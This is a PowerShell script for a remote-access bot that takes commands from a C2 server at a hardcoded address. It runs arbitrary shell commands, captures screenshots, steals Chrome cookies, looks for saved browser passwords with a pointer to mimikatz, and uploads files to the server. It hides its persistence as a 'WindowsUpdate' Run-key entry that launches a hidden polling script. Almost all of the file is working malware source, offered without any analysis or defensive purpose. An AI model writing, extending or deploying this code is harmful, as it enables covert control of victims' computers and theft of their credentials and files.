$IP = "192.168.1.14"
$PORT = "8000"
$BOTID = -join ((48..57) + (97..102) | Get-Random -Count 8 | ForEach-Object {[char]$_})

function Register-Bot {
    $body = @{
        bot_id = $BOTID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        capabilities = @("shell","screenshot","info","persist","cookies","passwords","processes","download","upload")
    } | ConvertTo-Json -Depth 10
    
    try {
        Invoke-RestMethod -Uri "http://$IP`:$PORT/c2/clear/register" -Method POST -Body $body -ContentType "application/json"
        return $true
    } catch { return $false }
}

function Check-Commands {
    try {
        $resp = Invoke-RestMethod -Uri "http://$IP`:$PORT/c2/clear/check/$BOTID" -Method GET
        return $resp.commands
    } catch { return @() }
}

function Send-Result($cmdId, $result) {
    $body = @{ cmd_id = $cmdId; result = $result } | ConvertTo-Json -Depth 10
    try {
        Invoke-RestMethod -Uri "http://$IP`:$PORT/c2/clear/result/$BOTID" -Method POST -Body $body -ContentType "application/json"
    } catch {}
}

function Execute-Shell($cmd) {
    try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        return $output
    } catch { return $_.Exception.Message }
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $imgData = [Convert]::ToBase64String($ms.ToArray())
        return @{image_data = $imgData} | ConvertTo-Json
    } catch { return @{error = $_.Exception.Message} | ConvertTo-Json }
}

function Get-SystemInfo {
    return @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        cpu = (Get-CimInstance Win32_Processor).Name
        memory = "$([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)) GB"
        disk = (Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
    } | ConvertTo-Json
}

function Get-Processes {
    $procs = Get-Process | Select-Object -First 50 Name, Id, CPU, WorkingSet
    return @{processes = $procs} | ConvertTo-Json -Depth 5
}

function Extract-Cookies {
    $cookies = @{}
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    if (Test-Path $chromePath) {
        try {
            # Chrome cookies (SQLite) - requires copying because file is locked
            $tempDb = "$env:TEMP\chrome_cookies_temp.db"
            Copy-Item $chromePath $tempDb -Force
            Add-Type -AssemblyName "System.Data.SQLite" -ErrorAction SilentlyContinue
            if ($?) {
                $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tempDb"
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT host_key, name, value FROM cookies LIMIT 20"
                $reader = $cmd.ExecuteReader()
                $chromeCookies = @()
                while ($reader.Read()) {
                    $chromeCookies += @{host=$reader["host_key"]; name=$reader["name"]; value=$reader["value"].Substring(0,[Math]::Min(30,$reader["value"].Length))}
                }
                $conn.Close()
                $cookies["chrome"] = $chromeCookies
            } else {
                $cookies["chrome"] = "SQLite assembly not available"
            }
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        } catch {
            $cookies["chrome_error"] = $_.Exception.Message
        }
    }
    
    # Edge
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
    if (Test-Path $edgePath) {
        $cookies["edge"] = "Edge cookies found but locked"
    }
    
    return @{cookies_found = $cookies.Count; browsers = $cookies} | ConvertTo-Json -Depth 5
}

function Extract-Passwords {
    # Requires mimikatz or similar - placeholder
    $passes = @{}
    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $loginData) {
        $passes["chrome"] = "Login Data found - requires DPAPI decryption"
    }
    return @{passwords_found = 0; browsers = $passes; note = "Use mimikatz for full extraction"} | ConvertTo-Json -Depth 5
}

function Download-File($filepath) {
    try {
        if (-not (Test-Path $filepath)) { return "File not found: $filepath" }
        $bytes = [System.IO.File]::ReadAllBytes($filepath)
        $b64 = [Convert]::ToBase64String($bytes)
        $filename = Split-Path $filepath -Leaf
        $body = @{filename = $filename; original_path = $filepath; file_data = $b64} | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri "http://$IP`:$PORT/c2/clear/file/$BOTID" -Method POST -Body $body -ContentType "application/json"
        return "File uploaded: $filename"
    } catch { return $_.Exception.Message }
}

function Establish-Persistence {
    try {
        $path = "$env:APPDATA\Microsoft\Windows\Update.ps1"
        $script = 'while($true){try{$c=IRM -Uri "http://' + $IP + ':' + $PORT + '/c2/clear/check/' + $BOTID + '" -Method GET;foreach($cmd in $c.commands){$r="";if($cmd.command -eq "shell"){$r=IEX $cmd.args[0] 2>&1|Out-String};if($cmd.command -eq "info"){$r=@{hostname=$env:COMPUTERNAME;username=$env:USERNAME}|ConvertTo-Json};$b=@{cmd_id=$cmd.cmd_id;result=$r}|ConvertTo-Json;IRM -Uri "http://' + $IP + ':' + $PORT + '/c2/clear/result/' + $BOTID + '" -Method POST -Body $b -ContentType "application/json"}Start-Sleep 10}catch{Start-Sleep 10}}'
        Set-Content -Path $path -Value $script
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -File $path"
        return "Persistence established: $path"
    } catch { return $_.Exception.Message }
}

# MAIN
if (Register-Bot) {
    while ($true) {
        $commands = Check-Commands
        foreach ($cmd in $commands) {
            $result = switch ($cmd.command) {
                "shell" { Execute-Shell ($cmd.args[0]) }
                "screenshot" { Take-Screenshot }
                "info" { Get-SystemInfo }
                "processes" { Get-Processes }
                "cookies" { Extract-Cookies }
                "passwords" { Extract-Passwords }
                "download" { Download-File ($cmd.args[0]) }
                "persist" { Establish-Persistence }
                "kill" { exit }
                default { "Unknown command: $($cmd.command)" }
            }
            Send-Result $cmd.cmd_id $result
        }
        Start-Sleep -Seconds 10
    }
}
